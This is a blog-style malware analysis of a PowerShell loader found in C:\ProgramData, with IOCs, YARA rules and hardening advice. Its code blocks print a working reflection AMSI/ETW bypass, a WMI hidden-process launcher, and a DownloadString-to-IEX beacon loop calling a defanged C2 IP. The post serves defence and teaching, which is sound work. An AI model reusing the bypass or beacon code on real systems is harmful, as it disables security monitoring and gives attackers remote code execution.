---
title: "The beacon that won't decrypt unless it beats AMSI: pulling apart a WMI-launched PowerShell loader"
date: 2026-05-30 09:00:00 +1000
categories: [Malware Analysis]
tags: [powershell, jscript, wmi, lolbin, amsi-bypass, etw-bypass, obfuscation, constrained-language-mode, application-control, c2]
description: "A WMI-launched PowerShell loader with reflection AMSI/ETW bypass and a payload that only decrypts if its own AMSI bypass succeeded first."
---

*The views and opinions expressed in this post are my own and do not represent those of my employer. This is a personal blog where I share research and things I'm learning.*

> **A note on what I had to work with.** This was recently detected; the initial-access source (what dropped `vimtucdi\` onto the box and what triggered the `.sct`) was not available at the time of review. Everything below is the chain I could verify from the two on-disk artifacts and what they do. Where I'm speculating about the upstream vector I say so.

> **TL;DR**
>
> A two-file commodity loader staged in `C:\ProgramData\vimtucdi\`: a `.sct` JScript launcher uses WMI `Win32_Process.Create` to spawn a hidden `powershell.exe` against an obfuscated `.ps1`. The loader nulls ETW and flips `amsiInitFailed` via reflection, then runs an XOR+Base64 codec whose key length is gated on the AMSI bypass having succeeded - if your defences win, the malware can't decrypt its own payload. The final stage is a 25-second HTTP `DownloadString -> IEX` beacon to a bare IP, with the C: volume serial as the bot ID.
>
> **If this is your fleet, do these first:**
>
> - Block script execution from user-writable paths with Application Control - hunt 4688 for `powershell.exe -file C:\ProgramData\*` if prevention slips.
> - Enforce Constrained Language Mode via WDAC/AppLocker; it disarms the reflection AMSI/ETW bypass and also breaks the AMSI-gated decryption.
> - Alert on the parent-laundering anomaly `WmiPrvSE.exe -> powershell.exe` from the WMI-Activity operational log.
> - Default-deny egress and alert on bare-IP HTTP from `powershell.exe` on a fixed 25-second cadence.
>
> Full IOCs and YARA at the bottom.
{: .prompt-tip }

---

Two files turned up in a `C:\ProgramData` folder with a name a cat could have typed: `vimtucdi`. One was a PowerShell script, `elrtwnbo.ps1`. The other was a `.sct` scriptlet, `disocjel.sct`. Random names, ProgramData staging - the universal smell of a loader that doesn't want to be read.

So I read it anyway. What I found was a tidy little commodity PowerShell beacon wrapped in four layers of obfuscation, with one genuinely clever touch I hadn't seen done quite this way: **the payload refuses to decrypt unless its own AMSI bypass succeeded first**. The attacker tied the decryption key to the evasion working. If your defences win, the malware breaks itself. Cheeky, and worth understanding.

Let's dig in - launcher, loader, and the beacon at the bottom - then turn each trick into something you can actually action.

## The attack at a glance

```text
disocjel.sct (JScript)
  └─ WMI Win32_Process.Create  ──>  powershell.exe -ep bypass -file elrtwnbo.ps1   (window hidden)
        └─ .Insert()/.Remove() + -split/index string rebuild
             └─ disable ETW  +  disable AMSI  (reflection)
                  └─ XOR+Base64 decrypt  ──>  IEX
                       └─ beacon: bot ID = C: volume serial
                            └─ loop: DownloadString("hxxp://77.221.155[.]150/<serial>") -> IEX  every 25s
```

Five moving parts, each one handing off to the next. None of it is exotic on its own - and that's exactly why it's worth your attention.

## How it works

### The launcher - WMI as a parent-process launderer

The `.sct` is plain JScript, no obfuscation. It does one thing:

```javascript
var path = "C:\\ProgramData\\vimtucdi\\elrtwnbo.ps1"
var proc = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process");
var startup = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_ProcessStartup").SpawnInstance_();
startup.ShowWindow = 0;   // hidden
proc.Create('powershell.exe -ep bypass -file "' + path + '"', null, startup);
```

A scriptlet (`.sct`) is a COM component defined in XML, and the classic way to fire one is `regsvr32 /s /i:file.sct scrobj.dll` - the "Squiblydoo" trick that runs script through a signed Microsoft binary. (The artifacts I had don't show what *triggered* the `.sct`, which matters - more on that at the end.)

The neat part is the use of **WMI `Win32_Process.Create`** to spawn PowerShell, instead of the obvious `WScript.Shell.Run`. When a process is created via WMI, its parent is `WmiPrvSE.exe` - not the script host that actually issued the request. Any detection keyed on "script host spawned PowerShell" sails right past this. And `ShowWindow = 0` keeps it invisible to the user.

### The loader - string soup, then defence demolition

`elrtwnbo.ps1` is 196 KB of this:

```powershell
$('EYDjA...'.Insert(10,'jd').Remove(7,1).Remove(5,6).Insert(9,'...') ... )
```

About 4,400 `.Insert()` and 6,200 `.Remove()` calls, building real strings one character at a time from junk literals - no Base64 or hex for a signature to grab onto. Peel that and you find a second layer: each rebuilt string is a long blob `-split` on a random delimiter into an array, then indexed to pick the real token (cmdlet, type, and method names). Two layers of pure busywork before anything happens.

Underneath, the actual logic is short and aggressive. First it **blinds the host's PowerShell telemetry**:

```powershell
# Disable ETW - null the PowerShell ETW provider's enable flag
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue(
  [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').
    GetField('etwProvider','NonPublic,Static').GetValue($null), 0)

# Disable AMSI - the textbook amsiInitFailed flip
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
```

Nulling `m_enabled` on the ETW provider quietly kills the event pipeline that feeds Script Block Logging. Setting `amsiInitFailed = $true` tricks .NET into thinking AMSI failed to initialise, so it stops scanning. Both are reflection tricks - and both **require Full Language Mode to work**, which is the hook for the defender section.

Then it aliases `Invoke-Expression` to a random name and calls a small XOR+Base64 codec to unpack the real payload:

```powershell
function decode($data, $mode, $n, $pass) {
  $enc = [Text.Encoding]::UTF8
  $key = [BitConverter]::GetBytes($n) + $enc.GetBytes($pass)   # [01,00,00,00] + UTF8(pass)
  $bytes = [Convert]::FromBase64String($data)
  $out = for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] -bxor $key[$i % ($key.Length * $n)] }
  $enc.GetString($out)
}
# n is NOT a constant - it's read back from the AMSI flag the script just set:
IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(
  decode '<blob>' 'd' ([int]$amsiInitFailed) 'pEctAiwaWzmsNCHIPuGV')))
```

Look at that third argument: `[int]$amsiInitFailed`. The XOR key length - `$key.Length * $n` - depends on the value of the AMSI flag the script set two lines earlier. If the AMSI bypass worked, `$amsiInitFailed` is `$true`, `[int]$true` is `1`, and the maths comes out right. If something *stopped* that bypass - say, Constrained Language Mode blocking the reflection - the flag stays false, `$n` becomes `0`, and the key index `i % (keylen * 0)` divides by zero. The payload destroys itself. **The malware only decrypts if it already won.** That's a genuinely tidy bit of self-gating, and it doubles as an anti-sandbox check.

### The payload - a 25-second command shell

Decrypted, the final stage is almost disappointingly small:

```powershell
$serial = [convert]::toint64(("{0:X}" -f (New-Object -Com "Scripting.FileSystemObject").GetDrive("c:\").SerialNumber),16)
$mutex = New-Object System.Threading.Mutex($false, $serial)
if (!$mutex.WaitOne(1)) { Exit }                       # one instance per host
$s = New-Object System.Net.WebClient
while ($true) {
    try { $result = $s.DownloadString("hxxp://77.221.155[.]150/$serial") }
    catch { Start-Sleep -s 25; continue }
    Invoke-Expression $result                          # run whatever comes back
    Start-Sleep -s 25
}
```

The bot ID is the **C: volume serial number**. Every 25 seconds it fetches `hxxp://77.221.155[.]150/<serial>` and `IEX`es the response. That's the whole implant: a remote command shell over plain HTTP. Whatever the operator wants done - recon, credential theft, a heavier payload - gets pushed at runtime. The stub itself stays tiny and boring on disk, which is the point.

## Techniques observed (MITRE ATT&CK)

| Tactic | Technique | ATT&CK ID | What it did here |
|--------|-----------|-----------|------------------|
| Execution | Visual Basic / JScript | T1059.007 | `.sct` JScript launcher |
| Execution | WMI | T1047 | `Win32_Process.Create` spawns PowerShell |
| Defense Evasion | Signed binary proxy (Squiblydoo) | T1218.010 | `.sct` via `regsvr32 ... scrobj.dll` (likely) |
| Execution | PowerShell | T1059.001 | `-ep bypass`; aliased `IEX` loop |
| Defense Evasion | Hidden window | T1564.003 | `ShowWindow = 0` |
| Defense Evasion | Obfuscated/encoded | T1027 / T1140 | `.Insert/.Remove` + `-split`; XOR+Base64 |
| Defense Evasion | Impair defenses - AMSI | T1562.001 | `amsiInitFailed = $true` |
| Defense Evasion | Impair defenses - ETW | T1562.006 | `etwProvider.m_enabled = 0` |
| Execution Guardrails | Environment keying | T1480 | key gated on `$amsiInitFailed`; volume-serial mutex |
| Command & Control | Web protocol | T1071.001 | `hxxp://77.221.155[.]150/<serial>`, 25 s loop |

*ATT&CK IDs are my own mapping from the observed behaviour.*

## Why this matters

Strip away the cleverness and you've got a remote-controlled PowerShell shell on the host, running with whatever rights the user had, executing fresh attacker code every 25 seconds and reporting to a hard-coded IP. From there it's the operator's call - dump credentials, move laterally, stage ransomware, or sell the foothold on. The implant on disk tells you almost nothing about the end goal, because the end goal arrives over the wire.

The honest lesson is how *ordinary* the parts are. WMI, `regsvr32`, reflection, `WebClient` - all legitimate, all signed, all present on every Windows box. The malice is in the combination, the location, and the sequence, not in any one exotic component. That's the kind of thing behaviour- and policy-based controls catch and signatures miss.

## What defenders can do

If this were my estate, here's where the effort goes - roughly in priority order.

| Technique (ATT&CK) | What to do | Essential Eight | What to hunt for |
|--------------------|-----------|-----------------|------------------|
| `.sct`/`.ps1` from ProgramData (T1059.001/.007) | App-control scripts in user-writable paths | Application Control (ML1+) | 4688: `powershell -file C:\ProgramData\*` |
| Reflection AMSI/ETW bypass (T1562.001/.006) | Constrained Language Mode | Application Control; User Application Hardening | 4104 *before* the disable; `amsiInitFailed`/`etwProvider` strings |
| WMI / Squiblydoo execution (T1047, T1218.010) | Constrain LOLBins; block `regsvr32` script-load | Application Control | WMI-Activity log; `WmiPrvSE.exe`->`powershell.exe` |
| HTTP `IEX` beacon (T1071.001) | Default-deny egress; block bare-IP HTTP | No clean E8 home - network architecture | 25 s periodic GETs to a bare IP from `powershell.exe` |

**Application control is the load-bearing fix, and it's worth being exact about why.** Both malicious files run from `C:\ProgramData\vimtucdi\` - a user-writable location, no admin needed. ASD's *Essential Eight Maturity Model* (November 2023) puts this at **Maturity Level One**, which states that *"application control is applied to user profiles and temporary folders used by operating systems, web browsers and email clients"* and *"restricts the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets to an organisation-approved set."* Scripts (`.ps1`) and HTML applications / scriptlets are explicitly in scope. A policy that actually enforces that stops both the `.sct` and the `.ps1` from running out of ProgramData, full stop. See *Implementing Application Control* (Nov 2023) for the build-out. If prevention slips, hunt **Event ID 4688** for `powershell.exe` with a `-file` argument under `C:\ProgramData\` or `%TEMP%`.

**Constrained Language Mode is the elegant counter to the whole evasion stack.** Every defence-tampering trick here - the AMSI flip, the ETW null, the reflection into private fields - needs Full Language Mode. CLM, enforced via WDAC/AppLocker (this is the *Securing PowerShell in the Enterprise*, Oct 2021, framework, cross-cutting Application Control), takes away the .NET reflection surface those bypasses depend on. As a bonus, it's the thing that trips the self-gating key maths and makes the payload fail to decrypt. Two birds. Detection-wise, **Script Block Logging (Event ID 4104)** records decoded script bodies - but note this sample *disables ETW specifically to kill that pipeline*, so the most reliable local catch is the brief window before the disable, plus the tell-tale strings `amsiInitFailed` and `etwProvider` in any 4104 events you do capture. Forward logs off-host so a local ETW kill doesn't blind your SIEM.

**Constrain the living-off-the-land binaries.** `regsvr32` loading a remote/local scriptlet and WMI spawning interpreters are LOLBin patterns application control can bite on - not by removing the binaries, but by constraining *how* they run. Watch the **WMI-Activity operational log** and hunt the parent->child anomaly **`WmiPrvSE.exe` -> `powershell.exe`**, which is exactly the parent-laundering this sample relies on and is rare in legitimate use.

**Treat the beacon as a network problem.** Plain-HTTP C2 to a hard-coded IP has no clean Essential Eight home - it's network architecture. Default-deny egress with a filtering proxy, and alert on **bare-IP HTTP from `powershell.exe`**, especially the fixed 25-second cadence with a numeric-only URI path. That beacon shape is a clean behavioural signature even when the payload changes.

## Hunting / detection summary

- **Event ID 4688** - `powershell.exe -ep bypass -file C:\ProgramData\*`; `regsvr32` with a `.sct`; parent `WmiPrvSE.exe` spawning `powershell.exe`.
- **Event ID 4104** (where ETW survives) - strings `amsiInitFailed`, `etwProvider`, `PSEtwLogProvider`, `FromBase64String` + `-bxor`.
- **WMI-Activity operational log** - `Win32_Process.Create` issuing a PowerShell command line.
- **Network** - periodic 25-second HTTP GETs to `77.221.155[.]150` with a numeric URI path; bare-IP HTTP from PowerShell generally.
- **Files** - `C:\ProgramData\*\*.ps1` paired with a `*.sct` in the same folder; the `vimtucdi` folder on other hosts.
- **Persistence to confirm** - `root\subscription` WMI event consumers, Scheduled Tasks, and Run keys that reference the `.sct`.

## Indicators of Compromise

| Type | Indicator | Notes |
|------|-----------|-------|
| C2 IP | `77.221.155[.]150` | bare IPv4, HTTP/port 80 |
| C2 URL | `hxxp://77.221.155[.]150/<C-volume-serial-int64>` | per-bot tasking endpoint |
| Beacon interval | 25 seconds | `Start-Sleep -s 25` |
| SHA256 | `8c8c40ea3023a9ca4e59a1e72b8464e0f8089cf5f94c4237c46757fb7e900214` | `elrtwnbo.ps1` loader |
| MD5 | `2cb101d16717db3921c2223ac2451200` | `elrtwnbo.ps1` loader |
| Path | `C:\ProgramData\vimtucdi\elrtwnbo.ps1` | obfuscated loader |
| Path | `C:\ProgramData\vimtucdi\disocjel.sct` | JScript launcher |
| Directory | `C:\ProgramData\vimtucdi\` | staging folder |
| Mutex / bot ID | C: volume serial number (int64) | single-instance + host ID |
| XOR password | `pEctAiwaWzmsNCHIPuGV` | codec key (+ `[01,00,00,00]` prefix) |

## Detection rules

```yara
rule PS_VolumeSerial_IEX_Beacon
{
    meta:
        description = "PowerShell HTTP beacon: volume-serial bot ID, DownloadString->IEX loop, AMSI/ETW bypass"
        author = "Luke Wilkinson"
        date = "2026-05-30"
    strings:
        $s1 = "Scripting.FileSystemObject" ascii nocase
        $s2 = ".SerialNumber" ascii nocase
        $s3 = "DownloadString" ascii nocase
        $s4 = "amsiInitFailed" ascii nocase
        $s5 = "etwProvider" ascii nocase
        $pass = "pEctAiwaWzmsNCHIPuGV" ascii
        $ip = "77.221.155.150" ascii
    condition:
        $pass or $ip or (3 of ($s*))
}

rule SCT_WMI_PowerShell_Launcher
{
    meta:
        description = "JScript .sct using WMI Win32_Process.Create to spawn hidden powershell -file"
    strings:
        $a = "Win32_Process" ascii nocase
        $b = "Win32_ProcessStartup" ascii nocase
        $c = "ShowWindow" ascii nocase
        $d = "powershell.exe -ep bypass -file" ascii nocase
        $e = "<scriptlet>" ascii nocase
    condition:
        4 of them
}
```

## Closing

The blockchain-grade tradecraft this isn't - it's a commodity beacon any number of crews could be running. But I loved the one detail: an attacker confident enough in their AMSI bypass to *bet the payload on it*. Turn that bet against them. Constrained Language Mode plus application control over user-writable folders doesn't just detect this chain - it makes the malware fail to decrypt itself. That's the kind of control I'll take every day.

One loose thread I'd chase first in a real response: nothing in these two files explains what *launched* the `.sct`. Go look at your WMI event subscriptions before you call it closed. Stay curious.

- Luke

---

*On methodology: the investigation is mine. The reverse engineering and analysis assembly were carried out with AI workflows (Claude, primarily). I reviewed every finding. Errors are mine - ping me on [X](https://twitter.com/btcoolteam) or [Instagram](https://instagram.com/blueteamcoolteam) if you spot something off.*

## References

- MITRE ATT&CK: [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1059.007](https://attack.mitre.org/techniques/T1059/007/), [T1047](https://attack.mitre.org/techniques/T1047/), [T1218.010](https://attack.mitre.org/techniques/T1218/010/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/), [T1562.006](https://attack.mitre.org/techniques/T1562/006/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/)
- ASD *Essential Eight Maturity Model* (Nov 2023): https://www.cyber.gov.au/business-government/asds-cyber-security-frameworks/essential-eight/essential-eight-maturity-model
- ASD *Implementing Application Control* (Nov 2023): https://www.cyber.gov.au/business-government/protecting-devices-systems/hardening-systems-applications/system-hardening/implementing-application-control
- ASD *Securing PowerShell in the Enterprise* (Oct 2021): https://www.cyber.gov.au/acsc/view-all-content/publications/securing-powershell-enterprise
